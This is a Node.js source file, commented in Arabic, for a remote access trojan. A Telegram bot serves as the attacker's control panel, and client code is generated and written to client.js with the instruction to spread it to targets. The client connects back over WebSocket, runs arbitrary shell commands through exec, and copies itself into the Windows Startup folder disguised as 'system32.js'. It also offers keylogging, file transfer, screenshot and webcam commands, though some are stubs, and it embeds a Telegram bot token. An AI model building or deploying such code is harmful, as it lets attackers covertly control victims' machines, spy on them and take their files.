// استيراد المكتبات المطلوبة
const express = require('express');        // لإدارة الخادم
const WebSocket = require('ws');          // للاتصال المباشر مع العملاء
const fs = require('fs');                 // للتعامل مع الملفات
const { Telegraf } = require('telegraf'); // للتحكم عبر بوت تلغرام
const axios = require('axios');           // لتحميل الملفات من الإنترنت
const path = require('path');             // للتعامل مع مسارات الملفات
const os = require('os');                 // لمعلومات النظام
const { v4: uuidv4 } = require('uuid');  // لإنشاء معرفات فريدة

// إعداد الخادم
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// توكن بوت تلغرام (مكشوف في الكود)
const botToken = '7511457992:AAE3-1GqnE_6ahBwSVk1A5tP84Hq-hc02Z8';
const bot = new Telegraf(botToken);

// تخزين العملاء المتصلين
const clients = new Map();
const commandHistory = [];

// المتغيرات العامة
let currentDir = process.cwd();     // المجلد الحالي للخادم
let selectedClient = '';            // العميل المحدد حالياً

// ============================================================
// أوامر بوت تلغرام (واجهة التحكم للمهاجم)
// ============================================================

// أمر الترحيب
bot.start((ctx) => {
    ctx.reply('🚀 مرحباً بك في لوحة التحكم عن بُعد\nاستخدم /help لعرض الأوامر المتاحة');
});

// أمر المساعدة (عرض جميع الأوامر)
bot.command('help', (ctx) => {
    ctx.reply(
        '📋 **الأوامر المتاحة:**\n' +
        '/list - عرض العملاء المتصلين\n' +
        '/select <المعرف> - اختيار عميل معين\n' +
        '/cmd <الأمر> - تنفيذ أمر على العميل المحدد\n' +
        '/upload - رفع ملف إلى العميل (قم بالرد على هذه الرسالة مع الملف)\n' +
        '/download <اسم الملف> - تحميل ملف من العميل\n' +
        '/screenshot - التقاط صورة لشاشة العميل\n' +
        '/webcam - التقاط صورة من كاميرا العميل\n' +
        '/keylog_start - بدء تسجيل ضغطات المفاتيح\n' +
        '/keylog_stop - إيقاف التسجيل وإرسال السجل\n' +
        '/persistence - تثبيت البرنامج ليبدأ تلقائياً مع النظام\n' +
        '/uninstall - إزالة البرنامج من النظام\n' +
        '/exit - فصل العميل'
    );
});

// معالجة النصوص العادية (أوامر مخصصة للعميل)
bot.on('text', (ctx) => {
    const text = ctx.message.text;
    if (text.startsWith('/')) return; // تجاهل الأوامر
    
    if (selectedClient && clients.has(selectedClient)) {
        const ws = clients.get(selectedClient);
        ws.send(JSON.stringify({ type: 'command', data: text }));
        ctx.reply(`✅ تم إرسال الأمر إلى العميل ${selectedClient}`);
    } else {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
    }
});

// معالجة رفع الملفات
bot.on('document', async (ctx) => {
    const fileId = ctx.message.document.file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'stream' });
    const filename = ctx.message.document.file_name;
    const savePath = path.join(__dirname, 'uploads', filename);
    
    // حفظ الملف على الخادم
    const writer = fs.createWriteStream(savePath);
    response.data.pipe(writer);
    
    writer.on('finish', () => {
        ctx.reply(`✅ تم رفع الملف إلى الخادم: ${filename}`);
        // إرسال الملف إلى العميل المحدد
        if (selectedClient && clients.has(selectedClient)) {
            const ws = clients.get(selectedClient);
            ws.send(JSON.stringify({ type: 'upload', data: savePath }));
        }
    });
});

// ============================================================
// إدارة اتصالات WebSocket مع العملاء
// ============================================================

wss.on('connection', (ws, req) => {
    // إنشاء معرف فريد للعميل
    const clientId = uuidv4();
    clients.set(clientId, ws);
    
    // معالجة الرسائل الواردة من العميل
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        
        // تسجيل عميل جديد
        if (data.type === 'register') {
            ws.send(JSON.stringify({ type: 'registered', id: clientId }));
            bot.telegram.sendMessage(botToken, `🟢 عميل جديد متصل: ${clientId}`);
        }
        
        // استلام نتيجة أمر من العميل
        if (data.type === 'command_result') {
            bot.telegram.sendMessage(botToken, `📊 نتيجة من العميل ${clientId}:\n${data.output}`);
        }
        
        // استلام ملف من العميل
        if (data.type === 'file_transfer') {
            const filePath = data.path;
            const filename = path.basename(filePath);
            bot.telegram.sendDocument(botToken, { source: filePath }, { caption: `📁 ملف من ${clientId}: ${filename}` });
        }
        
        // استلام صورة شاشة
        if (data.type === 'screenshot') {
            bot.telegram.sendPhoto(botToken, { source: data.image }, { caption: `🖼️ صورة شاشة من ${clientId}` });
        }
        
        // استلام سجل ضغطات المفاتيح
        if (data.type === 'keylog') {
            bot.telegram.sendMessage(botToken, `⌨️ سجل الضغطات من ${clientId}:\n${data.logs}`);
        }
    });
    
    // معالجة قطع الاتصال
    ws.on('close', () => {
        clients.delete(clientId);
        bot.telegram.sendMessage(botToken, `🔴 العميل قطع الاتصال: ${clientId}`);
    });
});

// صفحة رئيسية للخادم
app.get('/', (req, res) => {
    res.send('خادم التحكم عن بُعد يعمل');
});

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});

// ============================================================
// كود العميل (الجزء الذي يُزرع على أجهزة الضحايا)
// ============================================================

const clientCode = `
const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// عنوان الخادم (يجب تغييره إلى عنوان المهاجم)
const WS_URL = 'ws://localhost:3000';
let ws;

// ============================================================
// دالة الاتصال بالخادم
// ============================================================

function connect() {
    ws = new WebSocket(WS_URL);
    
    ws.on('open', () => {
        // إرسال طلب تسجيل إلى الخادم
        ws.send(JSON.stringify({ type: 'register' }));
    });
    
    ws.on('message', (data) => {
        const msg = JSON.parse(data);
        
        // تنفيذ أوامر النظام
        if (msg.type === 'command') {
            exec(msg.data, (error, stdout, stderr) => {
                const output = error ? stderr : stdout;
                ws.send(JSON.stringify({ type: 'command_result', output: output }));
            });
        }
        
        // استقبال ملف مرفوع
        if (msg.type === 'upload') {
            const filePath = msg.data;
            // معالجة الملف المستلم
        }
    });
    
    ws.on('close', () => {
        // محاولة إعادة الاتصال كل 5 ثوانٍ
        setTimeout(connect, 5000);
    });
}

connect();

// ============================================================
// وظيفة تثبيت البرنامج (الثبات / Persistence)
// ============================================================

function installPersistence() {
    const scriptPath = __filename; // مسار البرنامج الحالي
    // نسخ البرنامج إلى مجلد بدء التشغيل في ويندوز
    const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system32.js');
    fs.copyFileSync(scriptPath, startupPath);
}

// ============================================================
// كيلوجرر (تسجيل ضغطات المفاتيح)
// ============================================================

let keys = '';

function startKeylogger() {
    // تسجيل كل ما يكتب في وحدة التحكم
    process.stdin.on('data', (chunk) => {
        keys += chunk.toString();
    });
}

function getKeylogs() {
    const logs = keys;
    keys = ''; // مسح السجل بعد قراءته
    return logs;
}

// ============================================================
// التقاط صورة الشاشة
// ============================================================

function takeScreenshot() {
    // هذه الوظيفة تحتاج مكتبات إضافية (مثل node-canvas أو أدوات خارجية)
    // في هذا المثال يتم إرجاع اسم ملف وهمي
    return 'screenshot.png';
}

// ============================================================
// التقاط صورة من الكاميرا
// ============================================================

function captureWebcam() {
    // تحتاج إلى أدوات خارجية، يتم إرجاع اسم ملف وهمي
    return 'webcam.jpg';
}

// ============================================================
// تنفيذ التثبيت التلقائي عند بدء التشغيل
// ============================================================

installPersistence();
`;

// ============================================================
// حفظ كود العميل في ملف
// ============================================================

fs.writeFileSync('client.js', clientCode);
console.log('تم إنشاء كود العميل. قم بتوزيع ملف client.js على الأهداف.');
